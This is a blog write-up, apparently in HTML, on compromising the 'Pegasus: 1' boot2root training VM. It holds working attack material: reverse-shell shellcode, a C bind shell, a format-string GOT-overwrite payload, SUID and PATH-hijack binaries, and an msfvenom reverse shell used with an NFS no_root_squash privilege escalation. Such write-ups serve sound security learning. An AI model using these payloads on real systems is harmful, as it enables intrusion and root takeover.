@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Pegasus: 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-12-20">December 20, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/pegasus">pegasus</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Pegasus: 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Pegasus 1 is the first VM written by <a href="https://twitter.com/@TheKnapsy">Knapsy</a>, which he describes as being pitched at &lsquo;intermediate&rsquo; difficulty.  It&rsquo;s certainly a tricky VM, which I tore my hair out solving!</p>
+
+<h2 id="nmap:91c607fe46b1f5fb0d58bc60ee1366ec">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -A -p- 192.168.127.102
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 77:89:5b:52:ed:a5:58:6e:8e:09:f3:9e:f1:b0:d9:98 (DSA)
+|   2048 d6:62:f5:12:31:36:ed:08:2c:1a:5e:9f:3c:aa:1f:d2 (RSA)
+|_  256 c5:f0:be:e5:c0:9c:28:6e:23:5c:48:38:8b:4a:c4:43 (ECDSA)
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          49479/tcp  status
+|_  100024  1          56854/udp  status
+8088/tcp  open  http    nginx 1.1.19
+|_http-methods: No Allow or Public header in OPTIONS response (status code 405)
+|_http-title: Pegasus Technologies - Under Construction
+56996/tcp open  status  1 (RPC #100024)
+</code></pre>
+
+<p>There is nothing much to see in regards to the SSH or RPC service.  Loading up port 8088 in a browser you find a nice picture of Pegasus.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/pegasus-1/pegasus.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>Looking at the source code, I saw that the JPG had a filename of <code>pegasus_by_exomemory-d5ofhgw</code>.  This seemed to be a hint of some sort, so I downloaded it to my machine for some analysis.  After about half-an-hour of not finding anything, I went back to nginx.</p>
+
+<p>I wanted to crawl the service for any additional files or directories, so fired up <code>wfuzz</code>.</p>
+
+<pre><code class="language-text">root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404 http://192.168.127.102:8088/FUZZ
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: http://192.168.127.102:8088/FUZZ
+Payload type: file,/usr/share/wfuzz/wordlist/general/megabeast.txt
+
+Total requests: 45463
+==================================================================
+ID	Response   Lines      Word         Chars          Request    
+==================================================================
+
+00001:  C=200      9 L	      18 W	    189 Ch	  &quot; - admin&quot;
+00002:  C=200      9 L	      18 W	    189 Ch	  &quot; - bak&quot;
+00003:  C=200      9 L	      18 W	    189 Ch	  &quot; - Admin&quot;
+00004:  C=200      9 L	      18 W	    189 Ch	  &quot; - Backup&quot;
+00005:  C=200      9 L	      18 W	    189 Ch	  &quot; - warez&quot;
+00006:  C=200      9 L	      18 W	    189 Ch	  &quot; - pr0n&quot;
+00007:  C=200      9 L	      18 W	    189 Ch	  &quot; - porn&quot;
+</code></pre>
+
+<p>I cancelled this straight away because as you can see, every request came back with a <code>200 OK</code> response.  Every response is the same size - manually checking in a browser, I found that it just returns the same image as before.</p>
+
+<p>I found that if you stick a file extension on the end of the request, you do get <code>404 Not Found</code> responses.  So I adapted my fuzzing to only request resources with a <code>.php</code> extension.</p>
+
+<pre><code class="language-text">root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404 http://192.168.127.102:8088/FUZZ.php
+
+39916:  C=200      0 L	       4 W	     19 Ch	  &quot; - submit&quot;
+</code></pre>
+
+<p>Browsing to this page, all I saw was the message: <code>No data to process.</code>  Without any obvious way of knowing how to submit data via this, I figured another page may be submitting to it from a form or something.  I just needed to find it, so I kept throwing wordlists until I found:</p>
+
+<pre><code class="language-text">83134:  C=200     14 L	      58 W	    488 Ch	  &quot; - codereview&quot;
+</code></pre>
+
+<pre><code class="language-html">&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Pegasus Technologies - Code Review&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;h1&gt;Code review&lt;/h1&gt;
+		&lt;p&gt;Note: our trainee (Mike) will be reviewing the code until we come up with an official process and a proper portal for code submission.&lt;/p&gt;
+		&lt;p&gt;In the meantime, please use the form below.&lt;/p&gt;
+		&lt;form action=&quot;submit.php&quot; method=&quot;post&quot;&gt;
+			&lt;textarea name=&quot;code&quot; id=&quot;textarea&quot; cols=60 rows=30&gt;&lt;/textarea&gt;&lt;br/&gt;
+			&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+		&lt;/form&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>So this page really does submit to <code>submit.php</code> - the idea is that you can submit some code for &lsquo;review&rsquo; and a trainee called Mike will check it out for us.  I think we can assume that since Mike is a trainee, he&rsquo;s bound to make &lsquo;mistakes&rsquo; and probably won&rsquo;t be checking our code too carefully before running it.  The only problem, is that there&rsquo;s no indication of any language the code needs to be in.</p>
+
+<p>I don&rsquo;t think there is much to this than just guessing, so I spammed the box with all sorts of different reverse shell commands for bash, perl, python, ruby, php and java.  Nothing&hellip; Each submission came back with <code>Sent for review!</code> but nothing was running.</p>
+
+<p>I eventually got a different response when I tried:</p>
+
+<pre><code class="language-text">system(&quot;ping 192.168.127.101&quot;);
+...
+Sorry, due to security precautions, Mike won't review any code containing system() function call.
+</code></pre>
+
+<h2 id="reverse-shell:91c607fe46b1f5fb0d58bc60ee1366ec">Reverse Shell?</h2>
+
+<p>So it&rsquo;s looking like C is what needs to be submitted, but we can&rsquo;t use this function.  I submitted C code which, when compiled, would initial a reverse shell back to my machine.</p>
+
+<pre><code class="language-c">char shellcode[] =
+&quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&quot;
+&quot;\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x7f\x65\x68&quot;
+&quot;\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1&quot;
+&quot;\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3&quot;
+&quot;\x52\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;
+
+int main()
+{
+        int (*ret)() = (int(*)())shellcode;
+        ret();
+}
+</code></pre>
+
+<p>This didn&rsquo;t work however - tests on my local machine showed that it must be compiled with <code>no-stack-protector</code> and <code>execstack</code> for the binary to run; which is not being done on Pegasus.</p>
+
+<h2 id="bind-shell:91c607fe46b1f5fb0d58bc60ee1366ec">Bind Shell!</h2>
+
+<p>My next option was to attempt bind shellcode.  There&rsquo;s no shortage of examples on the Internet, and I found a good post by <a href="http://www.iodigitalsec.com/linux-shell-bind-tcp-shellcode/">Adam Palmer</a> made as part of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SLAE</a> course.</p>
+
+<pre><code class="language-c">#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;netinet/in.h&gt;
+
+int main(void)
+{
+        int clientfd, sockfd;
+        int dstport = 4444;
+        int o = 1;
+        struct sockaddr_in mysockaddr;
+
+        sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+        mysockaddr.sin_family = AF_INET;
+        mysockaddr.sin_port = htons(dstport);
+        mysockaddr.sin_addr.s_addr = INADDR_ANY;
+
+        bind(sockfd, (struct sockaddr *) &amp;mysockaddr, sizeof(mysockaddr));
+
+        listen(sockfd, 0);
+
+        clientfd = accept(sockfd, NULL, NULL);
+
+        dup2(clientfd, 0);
+        dup2(clientfd, 1);
+        dup2(clientfd, 2);
+
+        execve(&quot;/bin/sh&quot;, NULL, NULL);
+        return 0;
+}
+</code></pre>
+
+<p>I submitted this code, port scanned port 4444 and then connected to it.</p>
+
+<pre><code class="language-text">root@kali:~# nmap -n -p4444 192.168.127.102
+
+PORT     STATE SERVICE
+4444/tcp open  krb524
+</code></pre>
+
+<pre><code class="language-text">root@kali:~# nc -n 192.168.127.102 4444
+id
+uid=1001(mike) gid=1001(mike) groups=1001(mike)
+</code></pre>
+
+<p>There is a timeout to each process which gets executed, so my shell closed after a few minutes.  I just reconnected and echo&rsquo;d my public SSH key into Mike&rsquo;s .ssh authorized_keys file.</p>
+
+<h2 id="mike:91c607fe46b1f5fb0d58bc60ee1366ec">Mike</h2>
+
+<p>Mike has an email waiting to be read:</p>
+
+<pre><code class="language-text">mike@pegasus:~$ cat /var/spool/mail/mike 
+
+Hi Mike,
+
+I've crafted something simple in C, treating it as a refresher course for myself (it's been YEARS since I last coded something up) - would you mind reviewing it for me?
+
+I've put the binary in your home directory for convenience. You can also find the source code under our local git repo: my_first.git
+
+Thanks!
+John
+</code></pre>
+
+<p>True to his word, you can find the <code>my_first</code> binary in <code>/home/mike</code> and <code>my_first.git</code> in <code>/opt/git/</code>.</p>
+
+<pre><code class="language-text">-rwsrwxrwx 1 john john   6606 Nov 28 10:26 my_first*
+</code></pre>
+
+<p>You can clone the git repository to view the source code for <code>my_first</code>, but I just prodded the binary as it was.  It is owned by John and has the SUID bit set, so exploiting this will give us access as John.</p>
+
+<pre><code class="language-text">mike@pegasus:~$ ./my_first 
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
+[1] Calculator
+[2] String replay
+[3] String reverse
+[4] Exit
+</code></pre>
+
+<p>I tested the various inputs of each of the Selections, for obvious things such as buffer overflows.  But eventually I found a string format vulnerability in the Calculator function.</p>
+
+<pre><code class="language-text">Selection: 1
+
+Enter first number: 1
+Enter second number: %p
+Error details: 0xbf81186c
+</code></pre>
+
+<h2 id="string-format:91c607fe46b1f5fb0d58bc60ee1366ec">String Format</h2>
+
+<p>I absolutely <em>hate</em> string format vulns, because they&rsquo;re so god damn picky to get working.  The first job is to determine where the string starts on the stack.</p>
+
+<pre><code class="language-text">Enter second number: AAAA%p%p%p%p%p%p%p%p%p%p
+Error details: AAAA0xbf81186c0xa0xb759d1600xb770fac00xfbad22880x40xbf8118700x414141410x702570250x70257025
+</code></pre>
+
+<p>I make that to be the 8th position.  To confirm:</p>
+
+<pre><code class="language-text">Enter second number: AAAA%8$p
+Error details: AAAA0x41414141
+</code></pre>
+
+<p>ASLR is enabled on Pegasus, which we can bypass using <code>ulimit</code>.</p>
+
+<pre><code class="language-text">mike@pegasus:~$ cat /proc/sys/kernel/randomize_va_space
+2
+mike@pegasus:~$ ulimit -s unlimited
+</code></pre>
+
+<p>Now we need to collect some addresses.</p>
+
+<pre><code class="language-text">mike@pegasus:~$ objdump -R my_first
+
+my_first:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049bec R_386_GLOB_DAT    __gmon_start__
+08049c20 R_386_COPY        stdin
+08049bfc R_386_JUMP_SLOT   printf
+08049c00 R_386_JUMP_SLOT   fgets
+08049c04 R_386_JUMP_SLOT   puts
+08049c08 R_386_JUMP_SLOT   __gmon_start__
+08049c0c R_386_JUMP_SLOT   __libc_start_main
+08049c10 R_386_JUMP_SLOT   putchar
+08049c14 R_386_JUMP_SLOT   strtol
+</code></pre>
+
+<p>The GOT pointer for <code>printf</code> is at <code>0x08049bfc</code>.</p>
+
+<pre><code class="language-text">mike@pegasus:~$ gdb -q ./my_first
+(gdb) b main
+Breakpoint 1 at 0x804850f
+(gdb) r
+Starting program: /home/mike/my_first
+
+Breakpoint 1, 0x0804850f in main ()
+(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0x40069060 &lt;system&gt;
+</code></pre>
+
+<p>The address for <code>system</code> is at <code>0x40069060</code>.</p>
+
+<p>The plan of attack is to overwrite the address for <code>printf</code> with <code>system</code> and hopefully execute something such as <code>/bin/dash</code>.</p>
+
+<p>To find a place to break, I disassembled the main function and chose a <code>mov</code> instruction just before <code>printf</code>.</p>
+
+<pre><code class="language-text">0x08048569 &lt;+93&gt;:	mov    DWORD PTR [esp],0x8048905
+0x08048570 &lt;+100&gt;:	call   0x80483b0 &lt;printf@plt&gt;
+0x08048575 &lt;+105&gt;:	mov    eax,ds:0x8049c20
+</code></pre>
+
+<pre><code class="language-text">mike@pegasus:~$ printf '1\n\n\xfc\x9b\x04\x08%%8$n' &gt; sploit
+
+Breakpoint 1, 0x08048569 in main ()
+(gdb) x/x 0x08049bfc
+0x8049bfc &lt;printf@got.plt&gt;:     0x00000004
+</code></pre>
+
+<p>This confirms that I am able to overwrite the pointer for <code>printf</code>, so now to replace it with the address for <code>system</code>.</p>
+
+<pre><code class="language-text">mike@pegasus:~$ printf '1\n\n\xfe\x9b\x04\x08\xfc\x9b\x04\x08%%16382u%%8$hn%%20570u%%9$hn' &gt; sploit
+
+(gdb) x/x 0x08049bfc
+0x8049bfc &lt;printf@got.plt&gt;:     0x40069060
+</code></pre>
+
+<p>Now to run it outside of GDB.</p>
+
+<pre><code class="language-text">mike@pegasus:~$ cat sploit | ./my_first
+
+sh: 1: Selection:: not found
+
+Bye!
+</code></pre>
+
+<p>So now, the binary is looking for something called <code>Selection:</code>, time to place my payload.  I created a new binary which would copy <code>/bin/dash</code> into <code>/tmp</code> and set the SUID for john.</p>
+
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+int main()
+{
+        system(&quot;/bin/cp /bin/dash /tmp/sh&quot;);
+        system(&quot;/bin/chmod 4777 /tmp/sh&quot;);
+}
+</code></pre>
+
+<p>Compile this and ensure it&rsquo;s called <code>Selection:</code>.  Now modify the environmental PATH variable to ensure it gets executed.</p>
+
+<pre><code class="language-text">mike@pegasus:~$ export PATH=.:$PATH
+mike@pegasus:~$ env
+PATH=.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+</code></pre>
+
+<pre><code class="language-text">mike@pegasus:~$ cat sploit | ./my_first 
+mike@pegasus:~$ ll /tmp/
+-rwsrwxrwx  1 john mike 100284 Dec 20 10:59 sh*
+mike@pegasus:~$ /tmp/sh 
+$ id
+uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
+</code></pre>
+
+<h2 id="uids-gids:91c607fe46b1f5fb0d58bc60ee1366ec">UIDs &amp; GIDs</h2>
+
+<p>Currently, my <code>uid/gid=1001(mike)</code> and <code>euid=1000(john)</code>.  This means that I am able to browse john&rsquo;s home directory and create files.  But I lack the proper permissions to setup authorized_keys for john.</p>
+
+<pre><code class="language-text">-rw-rw-r-- 1 john mike    0 Dec 20 11:05 authorized_keys
+$ chown john:john authorized_keys
+chown: changing ownership of `authorized_keys': Operation not permitted
+</code></pre>
+
+<p>Because the SUID bit is only set for <code>user</code> and not <code>group</code> on <code>my_first</code>, I don&rsquo;t believe there is a way for me to obtain group rights for john.  One of the things I wanted to do, was check John&rsquo;s sudo rights.  But because my current UID is for Mike, I get prompted for his password.</p>
+
+<pre><code class="language-text">$ id
+uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
+$ sudo -l
+[sudo] password for mike:
+</code></pre>
+
+<p>What I wanted to do, was set my UID to <code>1000(john)</code>.  To do this, I wrote another binary in <code>/tmp</code>.</p>
+
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+ 
+int main(int argc, char *argv[])
+{
+	setreuid(1000,1000);
+	execv(&quot;/bin/dash&quot;, argv);
+	return 0;
+}
+</code></pre>
+
+<pre><code class="language-text">$ ./uid
+$ id
+uid=1000(john) gid=1001(mike) groups=1000(john),1001(mike)
+</code></pre>
+
+<p>Now my UID is correctly set, and I can run <code>sudo</code> as John.</p>
+
+<pre><code class="language-text">$ sudo -l
+Matching Defaults entries for john on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User john may run the following commands on this host:
+    (root) NOPASSWD: /usr/local/sbin/nfs
+</code></pre>
+
+<h2 id="nfs:91c607fe46b1f5fb0d58bc60ee1366ec">NFS</h2>
+
+<p>John may run NFS as root, reviewing <code>/etc/exports</code> reveals the following line:</p>
+
+<pre><code class="language-text">$ cat /etc/exports
+/opt/nfs	*(rw,sync,crossmnt,no_subtree_check,no_root_squash)
+</code></pre>
+
+<p><code>no_root_squash</code> is a critical configuration item as it fails to prevent root users of other systems writing root owned files to the NFS share (<code>root_squash</code> ensures the permissions of files are &lsquo;squashed&rsquo; to <code>nodody:nobody</code>).  Since I am root on Kali, it means I can mount the share, write a binary to it, set SUID etc and those permissions will persist on Pegasus which I can execute as any user.</p>
+
+<p>First, I start the NFS daemon.</p>
+
+<pre><code class="language-text">$ sudo /usr/local/sbin/nfs start
+ * Exporting directories for NFS kernel daemon...                                                                                                      [ OK ] 
+ * Starting NFS kernel daemon
+</code></pre>
+
+<p>Mount it on my Kali machine.</p>
+
+<pre><code class="language-text">root@kali:~# mount.nfs 192.168.127.102:/opt/nfs /mnt/
+root@kali:~# cd /mnt/
+</code></pre>
+
+<p>Now I will just create a basic reverse shell using <code>msfvenom</code>.</p>
+
+<pre><code class="language-text">root@kali:/mnt# msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.127.101 lport=4444 -f elf &gt; shell
+root@kali:/mnt# chmod 4777 shell 
+
+-rwsrwxrwx 1 root root 152 Dec 20 00:37 shell
+</code></pre>
+
+<p>Now, I can setup my listener and execute the shell from Pegasus.</p>
+
+<pre><code class="language-text">$ cd /opt/nfs
+$ ls -l
+-rwsrwxrwx 1 root root 152 Dec 20 11:37 shell
+$ ./shell
+</code></pre>
+
+<pre><code class="language-text">root@kali:~# nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.127.101] from (UNKNOWN) [192.168.127.102] 43805
+id; whoami
+uid=1000(john) gid=1001(mike) euid=0(root) groups=0(root),1001(mike)
+root
+</code></pre>
+
+<h2 id="flag:91c607fe46b1f5fb0d58bc60ee1366ec">Flag</h2>
+
+<pre><code class="language-text">ls -l /root
+-rw------- 1 root root 1824 Dec 16 19:09 flag
+
+cat /root/flag
+
+               ,
+               |`\        
+              /'_/_   
+            ,'_/\_/\_                       ,   
+          ,'_/\'_\_,/_                    ,'| 
+        ,'_/\_'_ \_ \_/                _,-'_/
+      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
+    ,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
+   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged
+    \_`\&gt; 6` 7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
+     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
+      \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
+        &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/
+      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
+     ( ) \_ \|_  `\_    \_,/'\,_'_,/'               a video game system sold in
+      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
+       \_)   &gt;        `\_                           It was a hardware clone of
+            /  `,      |`\_                         the Nintendo Famicom.
+           /    \     / \ `\
+          /   __/|   /  /  `\  
+         (`  (   (` (_  \   /   
+         /  ,/    |  /  /   \   
+        / ,/      | /   \   `\_ 
+      _/_/        |/    /__/,_/
+     /_(         /_( 
+
+
+CONGRATULATIONS! You made it :)
+
+Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
+learnt a thing or two while doing it! :)
+
+Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
+providing first review.
+
+Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
+and leave some feedback, I would love to hear from you!
+
+Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
+more awesome boot2root VMs!
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
